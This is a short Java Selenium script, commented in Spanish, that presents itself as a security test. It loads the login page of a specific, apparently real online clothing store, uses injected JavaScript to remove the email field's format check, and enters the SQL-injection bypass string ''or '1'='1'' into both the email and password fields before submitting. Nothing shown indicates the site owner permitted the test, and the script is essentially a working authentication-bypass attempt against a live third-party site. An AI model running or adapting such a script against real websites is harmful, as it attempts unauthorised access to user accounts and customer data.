import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.File;  // Import the File class
import java.io.FileWriter;
import java.io.IOException;  // Import the IOException class to handle errors

public class Seguridad_Login_Inyeccion_SQL {
    public static void main(String[] args) throws Exception {
    	// CARGAR DRIVER FIREFOX
	System.setProperty("webdriver.gecko.driver", "./driver/geckodriver.exe");
    WebDriver driver = new FirefoxDriver();
    
    	// PRUEBA
    // DESPLAZARSE A LA P�GINA DE INTER�S
    driver.get("https://www.rakayoclothing.com/");  // Iniciar instancia del navegador (p�gina Inicio)
    driver.findElement(By.id("customer_login_link")).click();  // Abrir cat�logo
    Thread.sleep(1500);
    
    // INTRODUCIR CAMPOS Y REALIZAR LOGIN
    	// Buscar los campos para el email y la contrase�a
    WebElement emailBox = driver.findElement(By.id("CustomerEmail"));
	WebElement passBox = driver.findElement(By.id("CustomerPassword"));  

	// MODIFICACIONES HTML
		/* La configuraci�n HTML del cuadro de correo no permite introducir elementos que no tengan un formato de correo electr�nico.
		 * Parte de la vulnerabilidad que se desea detectar (y con una modificaci�n sencilla  del documento HTML podr�a realizarse.
		 * Esta linea est� adaptado: NO es propio, pero es necesaria para realizar la prueba. 
		 * 
		 * Reemplaza la etiqueta HTML original por otra igual sin el type=email*/
	((JavascriptExecutor)driver).executeScript("var ele=arguments[0]; ele.outerHTML = '<input name=\"customer[email]\" id=\"CustomerEmail\" class=\"\" placeholder=\"Correo electr�nico\" autocorrect=\"off\" autocapitalize=\"none\" autofocus=\"\">';", emailBox);
	emailBox = driver.findElement(By.id("CustomerEmail"));  // Se actualiza el elemento que estamos buscando
	
		// Inyectar SQL (resultado TRUE)
	emailBox.sendKeys("'or '1'='1'");
	passBox.sendKeys("'or '1'='1'");
		// Pulsar el bot�n de login
    driver.findElement(By.xpath("//input[@class='btn'][@value='Registrarse']")).click();
    Thread.sleep(1500);
    System.out.println(driver.findElement(By.className("errors")));  // Muestra si se han producido errores
    driver.quit();
    }
}